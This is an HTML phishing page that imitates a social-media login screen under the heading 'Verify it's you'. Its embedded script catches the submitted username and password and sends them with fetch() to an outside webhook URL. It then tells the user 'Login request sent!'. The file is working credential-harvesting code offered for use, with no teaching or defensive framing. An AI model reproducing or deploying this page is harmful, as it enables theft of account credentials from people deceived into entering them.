<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-wrapper {
            width: 100%;
            max-width: 360px;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .verify-text {
            font-size: 18px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .logo {
            display: block;
            margin: 0 auto 30px;
            max-width: 175px;
        }

        input {
            width: 100%;
            margin: 6px 0;
            padding: 10px 12px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background-color: #fafafa;
        }

        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #3182ce;
        }

        .separator {
            display: flex;
            align-items: center;
            margin: 15px 0;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .separator span {
            margin: 0 10px;
            font-size: 12px;
            color: #8e8e8e;
            font-weight: 600;
        }

        .signup-text {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }

        .signup-text a {
            color: #3897f0;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="login-wrapper">
    <div class="login-container">
        <h2 class="verify-text">Verify it's you</h2>
        <img src="https://th.bing.com/th/id/OIP.oI-DyD4pmIc-tp6802DCcgHaCT?rs=1&pid=ImgDetMain" alt="Custom Logo" class="logo">
        <form id="login-form">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>

        <div class="separator">
            <span>OR</span>
        </div>

        <div class="signup-text">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</div>

<script>
    const webhookUrl = 'https://average-fireman-76.webhook.cool'; // Replace with your webhook URL

    document.getElementById('login-form').addEventListener('submit', async (event) => {
        event.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ username, password }),
            });

            alert('Login request sent!');
        } catch (error) {
            console.error('Error sending login data:', error);
            alert('Failed to send login data.');
        }
    });
</script>

</body>
</html>
